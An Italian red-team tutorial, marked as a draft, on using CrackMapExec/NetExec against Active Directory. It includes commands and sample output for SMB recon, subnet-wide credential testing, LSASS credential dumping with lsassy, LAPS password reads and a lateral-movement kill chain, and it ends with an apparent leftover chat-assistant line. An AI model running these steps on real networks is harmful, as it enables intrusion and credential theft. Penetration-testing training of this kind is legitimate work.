---
title: 'CrackMapExec: attacchi rapidi su Active Directory'
description: >-
  CrackMapExec è lo strumento all-in-one per testare credenziali, eseguire
  comandi e muoversi lateralmente in reti Windows. Usato da ogni Red Teamer.
draft: true
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - crackmapexec
  - cme
featured: false
---

# CrackMapExec / NetExec: scanner d'elite per hacking.

**Report Red Team – ambiente controllato e autorizzato**

Quando ottieni una coppia di credenziali valide in un dominio Windows, il problema non è più *se* puoi fare qualcosa, ma **dove andare e in quale ordine**.
CrackMapExec (CME) e il suo fork moderno **NetExec (NXC)** esistono per questo: trasformare un accesso iniziale in una **mappa operativa completa del dominio**.

Non sono scanner passivi. Sono strumenti di **post-sfruttamento aggressivo** che prendono credenziali (anche low-priv) e le testano in modo sistematico su SMB, WinRM, MSSQL e altri servizi, restituendoti in pochi secondi una fotografia precisa di privilegi, accessi e opportunità.

***

## Cos’è davvero CME / NetExec

CrackMapExec e NetExec sono framework offensivi orientati al concetto di **credential-centric attack**.
Non cercano CVE. Non fanno exploit zero-day. Sfruttano:

* configurazioni di default
* permessi eccessivi
* relazioni di trust
* cattiva igiene delle credenziali

Il loro valore è la **velocità**: un singolo comando sostituisce decine di test manuali, riducendo errori e rumore inutile.

In ottica red team, CME/NXC risponde a una domanda chiave:

> “Con queste credenziali, *chi* posso controllare, *dove* posso eseguire codice e *quanto* sono vicino al dominio?”

***

## Setup e primi passi

Su Kali Linux il fork attivo è **NetExec**.

```bash
sudo apt update && sudo apt install netexec -y
```

Verifica:

```bash
nxc --help
```

La sintassi è compatibile con CrackMapExec. Useremo `nxc` per chiarezza, ma la logica è identica.

Prerequisiti minimi:

* una rete target (es. 10.10.20.0/24)
* almeno un set di credenziali (dominio o locali)

***

## Tecniche offensive fondamentali

### Tecnica 1 – Ricognizione SMB senza credenziali

```bash
nxc smb 10.10.20.0/24 --gen-relay-list targets.txt
```

Output tipico:

```
SMB 10.10.20.5 445 DC01  Windows Server 2022 (signing:True)
SMB 10.10.20.10 445 WS01 Windows 10 (signing:False)
SMB 10.10.20.15 445 SRV01 Windows Server 2019 (signing:True)
```

**Perché è offensivo:**
Senza autenticarti ottieni:

* hostname
* versione OS
* dominio
* **stato SMB signing**

Gli host con `signing:False` sono immediatamente candidati per NTLM relay.
Hai già filtrato i bersagli ad alto valore senza fare login.

***

### Tecnica 2 – Validazione credenziali e privilegi

```bash
nxc smb 10.10.20.0/24 -u jdoe -p 'Password123!' -d LAB.LOCAL
```

Output:

```
DC01   [-] STATUS_LOGON_FAILURE
WS01   [+] LAB\jdoe (Pwn3d!)
SRV01  [+] LAB\jdoe
```

**Lettura red team:**

* `jdoe` non è Domain Admin
* `jdoe` è **admin locale su WS01**
* SRV01 è accessibile ma non compromesso

**Decisione tattica:** WS01 è la testa di ponte.

***

### Tecnica 3 – Enumerazione sessioni attive

```bash
nxc smb 10.10.20.10 -u jdoe -p 'Password123!' -d LAB.LOCAL -M sessions
```

Output tipico:

```
User: LAB\svc_sql
User: LAB\administrator (from SRV01)
```

**Valore operativo:**

* individui account di servizio
* individui **sessioni attive di Domain Admin**
* capisci quali host sono “macchine da amministratore”

Questo guida il movimento laterale.

***

### Tecnica 4 – Caccia alle credenziali (LSASS, LAPS)

```bash
nxc smb 10.10.20.10 -u jdoe -p 'Password123!' -d LAB.LOCAL -M lsassy
```

Possibile risultato:

```
WS01\jdoe:LocalPass!
LAB\svc_backup:BackupPass2024!
```

Hai appena:

* dumpato credenziali in chiaro
* ottenuto un account di servizio di dominio

Controllo LAPS:

```bash
nxc smb 10.10.20.0/24 -u jdoe -p 'Password123!' -d LAB.LOCAL -M laps
```

Se riesci a leggere `ms-Mcs-AdmPwd`, hai admin locale garantito su quell’host.

***

## Scenario red team completo (kill chain)

**Contesto:** compromissione iniziale di WS01 via phishing.

### Step 1 – Conferma privilegi

```bash
nxc smb 10.10.20.10 -u jdoe -p 'Password123!' -d LAB.LOCAL
```

`(Pwn3d!)` → admin locale confermato.

***

### Step 2 – Dump credenziali

```bash
nxc smb 10.10.20.10 -u jdoe -p 'Password123!' -d LAB.LOCAL -M lsassy
```

Ottieni `svc_backup`.

***

### Step 3 – Espansione orizzontale

```bash
nxc smb 10.10.20.0/24 -u svc_backup -p 'BackupPass2024!' -d LAB.LOCAL
```

Scopri accesso privilegiato su SRV01.

***

### Step 4 – Puntare al cuore

```bash
nxc smb 10.10.20.15 -u svc_backup -p 'BackupPass2024!' -d LAB.LOCAL -M sessions
```

Domain Admin loggato → bersaglio finale.

***

### Risultato

Partendo da un domain user:

* mapping completo dei privilegi
* furto credenziali di servizio
* controllo di server critici
* preparazione escalation di dominio

CME/NXC non “vince da solo”.
Ti porta **esattamente dove devi colpire**.

***

## CME / NetExec vs altri tool

* **BloodHound**
  eccellente per visualizzare relazioni AD
  lento per azione immediata
* **Impacket**
  potente per exploit e dump
  meno adatto alla mappatura rapida
* **CME / NXC**
  enumerazione tattica
  validazione privilegi
  esecuzione distribuita

**Conclusione:** si usano insieme.

***

## Considerazioni operative

1. **È un moltiplicatore di forza**
   Una credenziale non è mai “solo una credenziale”.
2. **È rumoroso**
   Genera logon SMB (tipo 3). In ambienti monitorati va usato con criterio.
3. **EDR e hardening contano**
   SMB signing, segmentazione e LSASS protection riducono l’impatto.
4. **È il collo di bottiglia del post-exploitation**
   Quasi ogni attacco AD serio passa da qui.

***

## Conclusione

CrackMapExec e NetExec sono la differenza tra:

* “ho una password”
* “ho il dominio sotto controllo”

In ambienti autorizzati, padroneggiarli significa **pensare come un operatore**, non come uno script kiddie.

***

## HackITA – supporto, formazione e servizi

Se questo contenuto ti è utile:

* **Supporta HackITA** per mantenere contenuti tecnici indipendenti
* **Formazione 1:1** per red team e pentester su Active Directory reale
* **Servizi per aziende**: assessment, hardening e simulazioni di attacco autorizzate

**Non lanciare tool. Costruisci la catena. Domina il dominio.**

Se vuoi, il prossimo lo facciamo **ancora più aggressivo** o **più difensivo blue-team**: dimmi tu.
